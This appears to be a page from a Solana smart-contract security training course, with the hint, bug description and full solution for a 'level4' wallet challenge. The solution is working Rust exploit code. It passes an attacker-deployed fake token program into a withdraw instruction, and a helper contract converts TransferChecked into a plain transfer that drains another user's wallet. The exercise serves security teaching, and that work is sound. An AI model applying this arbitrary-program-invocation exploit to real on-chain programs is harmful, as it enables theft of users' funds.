<p>Cross-program invocations are complex, what things can you control?</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bug-1"><a class="header" href="#bug-1">Bug</a></h1>
<p>The program allows you to control which program is invoked during withdraw. Can you exploit this?</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="solution---arbitrary-signed-program-invocation"><a class="header" href="#solution---arbitrary-signed-program-invocation">Solution - Arbitrary Signed Program Invocation</a></h1>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use solana_program::instruction::{AccountMeta, Instruction};
use borsh::BorshSerialize;

fn hack(env: &amp;mut LocalEnvironment, challenge: &amp;Challenge) {
    assert_tx_success(env.execute_as_transaction(
        &amp;[level4::initialize(
            challenge.wallet_program,
            challenge.hacker.pubkey(),
            challenge.mint,
        )],
        &amp;[&amp;challenge.hacker],
    ));

    let hacker_wallet_address = level4::get_wallet_address(
        &amp;challenge.hacker.pubkey(),
        &amp;challenge.wallet_program,
    )
    .0;
    let authority_address = level4::get_authority(&amp;challenge.wallet_program).0;
    let fake_token_program =
        env.deploy_program(&quot;target/deploy/level4_poc_contract.so&quot;);

    env.execute_as_transaction(
        &amp;[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(hacker_wallet_address, false),             // usually: wallet_address
                AccountMeta::new_readonly(authority_address, false),        // usually: authority_address
                AccountMeta::new_readonly(challenge.hacker.pubkey(), true), // usually: owner_address
                AccountMeta::new(challenge.wallet_address, false),          // usually: destination
                AccountMeta::new_readonly(spl_token::ID, false),            // usually: expected mint
                AccountMeta::new_readonly(fake_token_program, false),       // usually: spl_token program address
            ],
            data: level4::WalletInstruction::Withdraw { amount: 1337 }
                .try_to_vec()
                .unwrap(),
        }],
        &amp;[&amp;challenge.hacker],
    )
    .print_named(&quot;hax&quot;);
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="extra-helper-contract"><a class="header" href="#extra-helper-contract">Extra Helper Contract</a></h2>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use solana_program::{
    account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, program::invoke,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &amp;Pubkey,
    accounts: &amp;[AccountInfo],
    instruction_data: &amp;[u8],
) -&gt; ProgramResult {
    match spl_token::instruction::TokenInstruction::unpack(instruction_data).unwrap() {
        spl_token::instruction::TokenInstruction::TransferChecked { amount, .. } =&gt; {
            let source = &amp;accounts[0];
            let mint = &amp;accounts[1];
            let destination = &amp;accounts[2];
            let authority = &amp;accounts[3];
            invoke(
                &amp;spl_token::instruction::transfer(
                    mint.key,
                    destination.key,
                    source.key,
                    authority.key,
                    &amp;[],
                    amount,
                )
                .unwrap(),
                &amp;[
                    source.clone(),
                    mint.clone(),
                    destination.clone(),
                    authority.clone(),
                ],
            )
        }
        _ =&gt; {
            panic!(&quot;wrong ix&quot;)
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="resources"><a class="header" href="#resources">Resources</a></h1>
<p>Collection of helpful links:</p>
<ul>
<li><a href="https://docs.rs/poc-framework/0.1.2/poc_framework/trait.Environment.html">PoC Framework Docs</a></li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script type="text/javascript">
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->

        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>

    </body>
</html>
